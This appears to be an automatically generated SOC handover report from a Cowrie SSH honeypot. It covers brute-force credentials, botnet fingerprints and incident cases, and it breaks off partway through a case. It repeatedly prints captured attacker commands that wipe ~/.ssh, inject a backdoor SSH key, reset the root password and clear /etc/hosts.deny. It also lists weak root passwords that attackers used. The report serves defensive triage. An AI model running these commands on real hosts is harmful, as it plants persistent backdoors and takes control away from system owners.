# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-13 |
| **Generated At** | 2026-05-13T18:05:53Z |
| **Shift Time** | 18:05 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **274** |
| Confirmed Threats | **210** |
| False Positives Filtered | **64** (23.4%) |
| Unique Attacker IPs | **51** |
| Countries of Origin | **22** |
| High Severity Cases | **85** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **189** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **161** |
| Unique Credential Pairs | **55** |
| Unique Usernames | **27** |
| Unique Passwords | **54** |
| Successful Auth Pairs | **60** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 85 |
| `345gs5662d34` | 42 |
| `ir` | 2 |
| `uurgatiy` | 2 |
| `seekcy` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 42 |
| `3245gs5662d34` | 42 |
| `root-root` | 3 |
| `Cloud#123` | 3 |
| `ir` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 42 |
| `root` | `3245gs5662d34` | 42 |
| `root` | `root-root` | 3 |
| `root` | `Cloud#123` | 3 |
| `ir` | `ir` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `root-root` | `8.220.135.32` | 2026-05-13T15:42:57 |
| `root` | `3245gs5662d34` | `8.220.135.32` | 2026-05-13T15:43:00 |
| `root` | `Cloud#123` | `217.196.174.3` | 2026-05-13T15:46:45 |
| `root` | `3245gs5662d34` | `217.196.174.3` | 2026-05-13T15:46:49 |
| `root` | `Ww12345678` | `122.161.46.192` | 2026-05-13T15:51:00 |
| `root` | `3245gs5662d34` | `122.161.46.192` | 2026-05-13T15:51:02 |
| `root` | `root-root` | `195.250.72.168` | 2026-05-13T15:52:52 |
| `root` | `3245gs5662d34` | `195.250.72.168` | 2026-05-13T15:52:56 |
| `root` | `P@SSW0RD` | `122.161.46.192` | 2026-05-13T15:53:22 |
| `root` | `Aa666666` | `195.250.72.168` | 2026-05-13T15:56:20 |
| `root` | `Asdf1234` | `122.161.46.192` | 2026-05-13T15:57:47 |
| `root` | `Asdf1234` | `195.250.72.168` | 2026-05-13T15:58:05 |
| `root` | `Ww12345678` | `195.250.72.168` | 2026-05-13T15:59:50 |
| `root` | `abc123,./` | `195.250.72.168` | 2026-05-13T16:01:36 |
| `root` | `Cloud#123` | `195.250.72.168` | 2026-05-13T16:03:26 |
| `root` | `qwer1234.` | `122.161.46.192` | 2026-05-13T16:04:20 |
| `root` | `qweasdzxc123.` | `195.250.72.168` | 2026-05-13T16:05:14 |
| `root` | `qweasdzxc123.` | `122.161.46.192` | 2026-05-13T16:06:29 |
| `root` | `abc123,./` | `122.161.46.192` | 2026-05-13T16:08:38 |
| `root` | `Test12!@` | `195.250.72.168` | 2026-05-13T16:10:36 |
| `root` | `Test12!@` | `122.161.46.192` | 2026-05-13T16:10:55 |
| `root` | `P@SSW0RD` | `195.250.72.168` | 2026-05-13T16:14:36 |
| `root` | `Qazxsw123!` | `122.161.46.192` | 2026-05-13T16:15:10 |
| `root` | `qwer1234.` | `195.250.72.168` | 2026-05-13T16:16:23 |
| `root` | `Aa666666` | `122.161.46.192` | 2026-05-13T16:17:16 |
| `root` | `Cloud#123` | `122.161.46.192` | 2026-05-13T16:19:18 |
| `root` | `aa111111` | `195.250.72.168` | 2026-05-13T16:20:28 |
| `root` | `root-root` | `122.161.46.192` | 2026-05-13T16:23:39 |
| `root` | `aa111111` | `122.161.46.192` | 2026-05-13T16:28:02 |
| `root` | `2073` | `125.77.133.94` | 2026-05-13T16:35:05 |
| `root` | `3245gs5662d34` | `125.77.133.94` | 2026-05-13T16:35:09 |
| `root` | `2073` | `202.145.0.18` | 2026-05-13T16:35:20 |
| `root` | `3245gs5662d34` | `202.145.0.18` | 2026-05-13T16:35:23 |
| `root` | `johan123` | `193.39.208.26` | 2026-05-13T16:36:54 |
| `root` | `3245gs5662d34` | `193.39.208.26` | 2026-05-13T16:36:58 |
| `root` | `alex123` | `129.222.203.132` | 2026-05-13T16:38:43 |
| `root` | `3245gs5662d34` | `129.222.203.132` | 2026-05-13T16:38:51 |
| `root` | `136262` | `181.0.214.136` | 2026-05-13T16:40:32 |
| `root` | `3245gs5662d34` | `181.0.214.136` | 2026-05-13T16:40:44 |
| `root` | `lukas123` | `183.36.126.68` | 2026-05-13T16:46:24 |
| `root` | `tech123` | `163.7.9.55` | 2026-05-13T16:52:08 |
| `root` | `3245gs5662d34` | `163.7.9.55` | 2026-05-13T16:52:12 |
| `root` | `Pass2021` | `36.112.133.74` | 2026-05-13T16:54:12 |
| `root` | `3245gs5662d34` | `36.112.133.74` | 2026-05-13T16:54:28 |
| `root` | `ashley` | `36.95.194.51` | 2026-05-13T16:55:54 |
| `root` | `3245gs5662d34` | `36.95.194.51` | 2026-05-13T16:55:57 |
| `root` | `NM1$88` | `189.50.142.78` | 2026-05-13T16:56:11 |
| `root` | `3245gs5662d34` | `189.50.142.78` | 2026-05-13T16:56:20 |
| `root` | `ashley` | `177.229.197.38` | 2026-05-13T17:00:53 |
| `root` | `3245gs5662d34` | `177.229.197.38` | 2026-05-13T17:01:00 |
| `root` | `QWE!@#123` | `41.90.100.147` | 2026-05-13T17:24:57 |
| `root` | `3245gs5662d34` | `41.90.100.147` | 2026-05-13T17:25:03 |
| `root` | `abc123xyz` | `179.51.153.37` | 2026-05-13T17:46:20 |
| `root` | `3245gs5662d34` | `179.51.153.37` | 2026-05-13T17:46:29 |
| `root` | `woaini521.` | `179.51.153.37` | 2026-05-13T17:48:30 |
| `root` | `1q2w3e4r@` | `125.39.179.192` | 2026-05-13T17:53:26 |
| `root` | `3245gs5662d34` | `125.39.179.192` | 2026-05-13T17:53:30 |
| `root` | `www.123.com` | `179.51.153.37` | 2026-05-13T17:53:44 |
| `root` | `qwer!@#$` | `179.51.153.37` | 2026-05-13T17:57:48 |
| `root` | `Aa@123456..` | `179.51.153.37` | 2026-05-13T18:00:54 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **274** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 170 |
| Perl Net::SSH | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 114 | 11 |
| `af8223ac9914...` | libssh-based | 34 | 4 |
| `03a80b21afa8...` | Modern SSH client | 17 | 7 |
| `3c0eaacec19b...` | Mirai/variant | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 114 | 11 | Mirai/variant |
| `af8223ac9914...` | libssh | 34 | 4 | libssh-based |
| `03a80b21afa8...` | libssh | 17 | 7 | Modern SSH client |
| `95420f9d932d...` | libssh | 5 | 4 | — |
| `3c0eaacec19b...` | Perl Net::SSH | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 42 | 17 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:qfqjJuSvNIO2"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `183.36.126.68`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `125.39.179.192`, `179.51.153.37`, `41.90.100.147`, `202.145.0.18`, `189.50.142.78`, `129.222.203.132`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **51** |
| Unique ASNs | **38** |
| High-Risk ASNs | **26** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 6 | HIGH |
| `AS396982` | Google LLC | 3 | LOW |
| `AS213412` | ONYPHE SAS | 3 | HIGH |
| `AS13999` | Mega Cable, S.A. de C.V. | 2 | HIGH |
| `AS23724` | IDC, China Telecommunications Corporation | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS24560` | Bharti Airtel Ltd., Telemedia Services | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (85)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ea574f9be2a9

| Field | Detail |
|---|---|
| **Source IP** | `8.220.135[.]32` |
| **First Seen** | 2026-05-13 15:42 |
| **Last Seen** | 2026-05-13 15:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 15:42:56` | `cowrie.session.connect` |
| `2026-05-13 15:42:56` | `cowrie.client.version` |
| `2026-05-13 15:42:56` | `cowrie.client.kex` |
| `2026-05-13 15:42:57` | `cowrie.login.success` |
| `2026-05-13 15:42:57` | `cowrie.session.params` |
| `2026-05-13 15:42:57` | `cowrie.command.input` |
| `2026-05-13 15:42:57` | `cowrie.command.failed` |
| `2026-05-13 15:42:57` | `cowrie.log.closed` |
| `2026-05-13 15:42:57` | `cowrie.session.params` |
| `2026-05-13 15:42:57` | `cowrie.command.input` |
| `2026-05-13 15:42:58` | `cowrie.session.file_download` |
| `2026-05-13 15:42:58` | `cowrie.log.closed` |
| `2026-05-13 15:43:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.220.135[.]32` to AbuseIPDB if not already reported
- [ ] Block `8.220.135[.]32` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16b82bbf0440

| Field | Detail |
|---|---|
| **Source IP** | `8.220.135[.]32` |
| **First Seen** | 2026-05-13 15:42 |
| **Last Seen** | 2026-05-13 15:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 15:42:59` | `cowrie.session.connect` |
| `2026-05-13 15:42:59` | `cowrie.client.version` |
| `2026-05-13 15:42:59` | `cowrie.client.kex` |
| `2026-05-13 15:43:00` | `cowrie.login.success` |
| `2026-05-13 15:43:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.220.135[.]32` to AbuseIPDB if not already reported
- [ ] Block `8.220.135[.]32` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50f8ab0de89d

| Field | Detail |
|---|---|
| **Source IP** | `217.196.174[.]3` |
| **First Seen** | 2026-05-13 15:46 |
| **Last Seen** | 2026-05-13 15:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 15:46:44` | `cowrie.session.connect` |
| `2026-05-13 15:46:45` | `cowrie.client.version` |
| `2026-05-13 15:46:45` | `cowrie.client.kex` |
| `2026-05-13 15:46:45` | `cowrie.login.success` |
| `2026-05-13 15:46:46` | `cowrie.session.params` |
| `2026-05-13 15:46:46` | `cowrie.command.input` |
| `2026-05-13 15:46:46` | `cowrie.command.failed` |
| `2026-05-13 15:46:46` | `cowrie.log.closed` |
| `2026-05-13 15:46:46` | `cowrie.session.params` |
| `2026-05-13 15:46:46` | `cowrie.command.input` |
| `2026-05-13 15:46:46` | `cowrie.session.file_download` |
| `2026-05-13 15:46:46` | `cowrie.log.closed` |
| `2026-05-13 15:46:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.196.174[.]3` to AbuseIPDB if not already reported
- [ ] Block `217.196.174[.]3` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd756e931623

| Field | Detail |
|---|---|
| **Source IP** | `217.196.174[.]3` |
| **First Seen** | 2026-05-13 15:46 |
| **Last Seen** | 2026-05-13 15:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 15:46:49` | `cowrie.session.connect` |
| `2026-05-13 15:46:49` | `cowrie.client.version` |
| `2026-05-13 15:46:49` | `cowrie.client.kex` |
| `2026-05-13 15:46:49` | `cowrie.login.success` |
| `2026-05-13 15:46:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.196.174[.]3` to AbuseIPDB if not already reported
- [ ] Block `217.196.174[.]3` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-194bbf14d6d2

| Field | Detail |
|---|---|
| **Source IP** | `122.161.46[.]192` |
| **First Seen** | 2026-05-13 15:51 |
| **Last Seen** | 2026-05-13 15:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 15:51:00` | `cowrie.session.connect` |
| `2026-05-13 15:51:00` | `cowrie.client.version` |
| `2026-05-13 15:51:00` | `cowrie.client.kex` |
| `2026-05-13 15:51:00` | `cowrie.login.success` |
| `2026-05-13 15:51:00` | `cowrie.session.params` |
| `2026-05-13 15:51:00` | `cowrie.command.input` |
| `2026-05-13 15:51:00` | `cowrie.command.failed` |
| `2026-05-13 15:51:00` | `cowrie.log.closed` |
| `2026-05-13 15:51:00` | `cowrie.session.params` |
| `2026-05-13 15:51:00` | `cowrie.command.input` |
| `2026-05-13 15:51:00` | `cowrie.session.file_download` |
| `2026-05-13 15:51:00` | `cowrie.log.closed` |
| `2026-05-13 15:51:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.161.46[.]192` to AbuseIPDB if not already reported
- [ ] Block `122.161.46[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4874a3e35b8c

| Field | Detail |
|---|---|
| **Source IP** | `122.161.46[.]192` |
| **First Seen** | 2026-05-13 15:51 |
| **Last Seen** | 2026-05-13 15:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 15:51:02` | `cowrie.session.connect` |
| `2026-05-13 15:51:02` | `cowrie.client.version` |
| `2026-05-13 15:51:02` | `cowrie.client.kex` |
| `2026-05-13 15:51:02` | `cowrie.login.success` |
| `2026-05-13 15:51:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.161.46[.]192` to AbuseIPDB if not already reported
- [ ] Block `122.161.46[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f4771c54bcf

| Field | Detail |
|---|---|
| **Source IP** | `195.250.72[.]168` |
| **First Seen** | 2026-05-13 15:52 |
| **Last Seen** | 2026-05-13 15:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 15:52:51` | `cowrie.session.connect` |
| `2026-05-13 15:52:51` | `cowrie.client.version` |
| `2026-05-13 15:52:51` | `cowrie.client.kex` |
| `2026-05-13 15:52:52` | `cowrie.login.success` |
| `2026-05-13 15:52:52` | `cowrie.session.params` |
| `2026-05-13 15:52:52` | `cowrie.command.input` |
| `2026-05-13 15:52:52` | `cowrie.command.failed` |
| `2026-05-13 15:52:53` | `cowrie.log.closed` |
| `2026-05-13 15:52:53` | `cowrie.session.params` |
| `2026-05-13 15:52:53` | `cowrie.command.input` |
| `2026-05-13 15:52:53` | `cowrie.session.file_download` |
| `2026-05-13 15:52:53` | `cowrie.log.closed` |
| `2026-05-13 15:52:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.250.72[.]168` to AbuseIPDB if not already reported
- [ ] Block `195.250.72[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00ba3aeb0ed1

| Field | Detail |
|---|---|
| **Source IP** | `195.250.72[.]168` |
| **First Seen** | 2026-05-13 15:52 |
| **Last Seen** | 2026-05-13 15:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 15:52:56` | `cowrie.session.connect` |
| `2026-05-13 15:52:56` | `cowrie.client.version` |
| `2026-05-13 15:52:56` | `cowrie.client.kex` |
| `2026-05-13 15:52:56` | `cowrie.login.success` |
| `2026-05-13 15:52:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.250.72[.]168` to AbuseIPDB if not already reported
- [ ] Block `195.250.72[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cff3e7725e22

| Field | Detail |
|---|---|
| **Source IP** | `122.161.46[.]192` |
| **First Seen** | 2026-05-13 15:53 |
| **Last Seen** | 2026-05-13 15:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 15:53:22` | `cowrie.session.connect` |
| `2026-05-13 15:53:22` | `cowrie.client.version` |
| `2026-05-13 15:53:22` | `cowrie.client.kex` |
| `2026-05-13 15:53:22` | `cowrie.login.success` |
| `2026-05-13 15:53:22` | `cowrie.session.params` |
| `2026-05-13 15:53:22` | `cowrie.command.input` |
| `2026-05-13 15:53:22` | `cowrie.command.failed` |
| `2026-05-13 15:53:22` | `cowrie.log.closed` |
| `2026-05-13 15:53:23` | `cowrie.session.params` |
| `2026-05-13 15:53:23` | `cowrie.command.input` |
| `2026-05-13 15:53:23` | `cowrie.session.file_download` |
| `2026-05-13 15:53:23` | `cowrie.log.closed` |
| `2026-05-13 15:53:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.161.46[.]192` to AbuseIPDB if not already reported
- [ ] Block `122.161.46[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5f2fb2941af

| Field | Detail |
|---|---|
| **Source IP** | `122.161.46[.]192` |
| **First Seen** | 2026-05-13 15:53 |
| **Last Seen** | 2026-05-13 15:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 15:53:24` | `cowrie.session.connect` |
| `2026-05-13 15:53:24` | `cowrie.client.version` |
| `2026-05-13 15:53:24` | `cowrie.client.kex` |
| `2026-05-13 15:53:24` | `cowrie.login.success` |
| `2026-05-13 15:53:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.161.46[.]192` to AbuseIPDB if not already reported
- [ ] Block `122.161.46[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fafaad43453

| Field | Detail |
|---|---|
| **Source IP** | `195.250.72[.]168` |
| **First Seen** | 2026-05-13 15:56 |
| **Last Seen** | 2026-05-13 15:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
